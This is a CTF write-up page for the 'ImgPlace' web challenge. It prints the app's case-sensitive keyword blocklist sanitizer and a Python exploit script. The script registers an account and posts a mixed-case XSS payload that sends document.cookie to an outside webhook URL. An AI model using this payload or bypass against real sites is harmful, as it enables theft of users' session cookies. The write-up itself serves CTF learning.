               

<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    

    <title>ImgPlace - ByteTheCookies</title>

    

    

    
    <meta name="author" content="ByteTheCookies" />
    

    
        <meta property="og:title" content="ImgPlace" />
<meta property="og:description" content="ImgPlace Description: Are you a photographer but have no reputation? Join ImgPlace! Share your photos&hellip; and become popular!
Introduction We have a very simple application where we are allowed to register and log in and then we can upload images via url and associated description
Source The source is only parsable by devtools from the browser, and we can see that in the pic.js file we have a function that sanitizes the image description" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/m0lecon2025beginner/imgplace/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2024-12-23T16:48:55+01:00" />
<meta property="article:modified_time" content="2024-12-23T17:59:29+01:00" />


    

    
        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="ImgPlace"/>
<meta name="twitter:description" content="ImgPlace Description: Are you a photographer but have no reputation? Join ImgPlace! Share your photos&hellip; and become popular!
Introduction We have a very simple application where we are allowed to register and log in and then we can upload images via url and associated description
Source The source is only parsable by devtools from the browser, and we can see that in the pic.js file we have a function that sanitizes the image description"/>
<meta name="twitter:site" content="@ByteTheCookies"/>

    <link rel="stylesheet" href="/style.css" integrity="">



    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">



    
        <script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
></script>
<script>
  MathJax = {
    tex: {
      displayMath: [
        ["\\[", "\\]"],
        ["$$", "$$"],
      ], 
      inlineMath: [
        ["\\(", "\\)"],
        ["$", "$"],
      ], 
    },
  };
</script>

    

    
    <script>
        if (!('theme' in localStorage)) {
            localStorage.theme = 'dark';
        }

        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.setAttribute("data-theme", "dark");
        } else {
            document.documentElement.setAttribute("data-theme", "light");
        }
    </script>
<script defer src="/js/header.js" integrity=""></script>



    <script defer src="/js/zooming.js" integrity=""></script>







    
        

        
        

        
        
            
        

        <script defer src="/js/prism.js" integrity="" data-manual></script>
    



    
    
    
    <script defer src="/js/search-en.js" integrity=""></script>




<link rel="stylesheet" href="http://localhost:1313/user.css">

    

</head>
<body><header>
    <div id="header_left">
        <div id="sidebar_btn">
            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
            <label id="sidebar_btn_label" for="sidebar_btn_input">
                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
</svg>

</svg>
            </label>
            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
                <div id="sidebar_canvas_overlay"></div>
            </label>
            <div id="sidebar">
                <ul><li>
                            <a href="/">üíª About</a></li><li>
                            <a href="/news/">üì∞ News</a></li><li>
                            <a href="/writeups/">üìë Writeups</a></li><li>
                            <a href="/contacts/">‚úâÔ∏è Contacts</a></li></ul>
            </div>
        </div>
    
        <div class="brand">
            <div>
                <a href="/">ByteTheCookies</a>
            </div>
        </div>
    </div>

    <div class="toolbox">
        <div id="theme_tool">
            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
</svg>

</svg>
            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
</svg>

</svg>
        </div>

        
            <div id="search_tool">
                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>

</svg><div id="search_menu_wrapper" class="hidden">
    <div id="search_menu">
        <div id="search_menu_toolbar">
            <div id="search_menu_input_wrapper">
                <input id="search_menu_input" type="text" placeholder='Search Posts'>
            </div>
            <div id="search_menu_close_btn">
                <svg width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
</svg>

</svg>
            </div>
        </div>
        <div id="search_menu_results">
        </div>
    </div>
</div>
</div>
        

        
    </div>
</header>
<nav id="navbar" class="pure-menu">
    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
                    
                        <a href="/" class="pure-menu-link">üíª About</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/news/" class="pure-menu-link">üì∞ News</a>
                    
                </li><li class="navbar-item pure-menu-item insection">
                    
                        <a href="/writeups/" class="pure-menu-link">üìë Writeups</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/contacts/" class="pure-menu-link">‚úâÔ∏è Contacts</a>
                    
                </li></ul>
</nav>
<main>
      <div id="content" class="content-margin">
        
    
    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#source">Source</a></li>
    <li><a href="#solution">Solution</a></li>
  </ul>
</nav>
        
    </div></details>



<div class="tags">
  
    <div class="badge">Web</div>

  
    <div class="badge">Python</div>

  
    <div class="badge">XSS</div>

  
    <div class="badge">232 points</div>

  
    <div class="badge">13 solves</div>

  
    <div class="badge">dadadani</div>

  
</div>

<div>
  <p class="date">
    Last edit: Dec 23, 2024
  </p>
</div>


    <div class="content-margin">



<article >
    
    
        
        
    
    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>ImgPlace</h1>
<p><strong>Description</strong>: Are you a photographer but have no reputation? Join ImgPlace! Share your photos&hellip; and become popular!</p>

<h2 id="introduction" class="header-anchor-wrapper">Introduction
  <a href="#introduction" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>We have a very simple application where we are allowed to register and log in and then we can upload images via url and associated description</p>

<h2 id="source" class="header-anchor-wrapper">Source
  <a href="#source" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>The source is only parsable by devtools from the browser, and we can see that in the pic.js file we have a function that sanitizes the image description</p>
<pre  class="mc-prism hide language-text" ><code class="language-javascript"># filename: pic.js

&quot;use strict&quot;;

(async () =&gt; {
    const picPhoto = document.getElementById(&quot;picPhoto&quot;);
    const picDesc = document.getElementById(&quot;picDesc&quot;);

    const r = await fetch(&quot;/api/pic/&quot; + window.picId);

    if (r.ok) {
        const data = await r.json();
        picPhoto.src = data.src;

        // We need to block dangerous things!
        const blocklist = [
            &quot;&lt;comment&quot;,
            &quot;&lt;embed&quot;,
            &quot;&lt;link&quot;,
            &quot;&lt;listing&quot;,
            &quot;&lt;meta&quot;,
            &quot;&lt;noscript&quot;,
            &quot;&lt;object&quot;,
            &quot;&lt;plaintext&quot;,
            &quot;&lt;script&quot;,
            &quot;&lt;xmp&quot;,
            &quot;&lt;style&quot;,
            &quot;&lt;applet&quot;,
            &quot;&lt;iframe&quot;,
            &quot;&lt;img&quot;,
            &quot;onload&quot;,
            &quot;onblur&quot;,
            &quot;onclick&quot;,
            &quot;onerror&quot;,
            &quot;href&quot;,
            &quot;javascript&quot;,
            &quot;window&quot;,
            &quot;src&quot;,
        ];
        let description = String(data.description);
        blocklist.forEach((word) =&gt; {
            description = description.replace(word, &quot;&quot;);
        });

        picDesc.innerHTML = description;
    } else {
        if (r.status == 401) {
            window.location.href = &quot;/profile&quot;;
        } else {
            alert(&quot;Unable to load photo!&quot;);
        }
    }
})();
</code></pre>
<p>We can see this trivially from the code that takes ById elements are taken and the word is deleted.</p>

<h2 id="solution" class="header-anchor-wrapper">Solution
  <a href="#solution" class="header-anchor-link">
    <svg width="16px" height="16px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
</svg>

</svg>
  </a>
</h2>

<p>There are really several solutions I used the simplest one which is to take advantage of the fact that the replace is case sensitive and no lowercase is done in the code to my description</p>
<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py

#!/usr/bin/python3
import random
import string

import requests
from bs4 import BeautifulSoup

BASE_URL = &quot;https://imgplace.challs.m0lecon.it&quot;
URL_HOOK = &quot;https://webhook.site/6a1df142-d272-4e11-8937-dbd81a33e9d2&quot;

def string_generator(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

s = requests.Session()

def register(username, password):
    r = s.post(f&quot;{BASE_URL}/register&quot;, data={&quot;username&quot;: username, &quot;password&quot;: password,&quot;confirmPassword&quot;:password})

    if r.status_code != 200:
        print(&quot;[+] Error register&quot;)
        print(r.text)
        exit(1)
    else:
        print(&quot;[+] Register success&quot;)

def login(username, password):
    r = s.post(f&quot;{BASE_URL}&quot;, data={&quot;username&quot;: username, &quot;password&quot;: password})
    if r.status_code != 200:
        print(&quot;[+] Error login&quot;)
        print(r.text)
        exit(1)
    else:
        print(&quot;[+] Login success&quot;)

def new(payload):
    r = s.post(f&quot;{BASE_URL}/new&quot;, data={&quot;url&quot;: URL_HOOK, &quot;description&quot;: payload})
    if r.status_code != 200:
        print(&quot;[+] Error new image&quot;)
        print(r.text)
        exit(1)
    else:
        print(&quot;[+] New Image Success&quot;)


def main():
    username,password = string_generator(10),string_generator(10)
    print(f&quot;Username: {username} Password : {password}&quot;)
    register(username,password)
    login(username,password)
    payload = &quot;&lt;ImG SrC=x OnError=fetch(`&quot;+URL_HOOK+&quot;?q=${document.cookie}`)&gt;&quot;
    new(payload=payload)
    print(&quot;[+] Done&quot;)
    print(&quot;[+] Now login to the website go to the image complete the captcha and you will get the flag on the webhook&quot;)


if __name__ == &quot;__main__&quot;:
	main()

# goodluck by @akiidjk
</code></pre>
<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: ptm{n3v3r_tRvST_t3g_bL0ckL1sts}
</code></pre>
<p align='right'>Author: akiidjk </p>

</article>
</div>
   
      </div>
    </main>
<footer>
    <article>Copyright ¬© 2024 by ByteTheCookies Team | v1.0</article>
</footer>

</body>
</html>
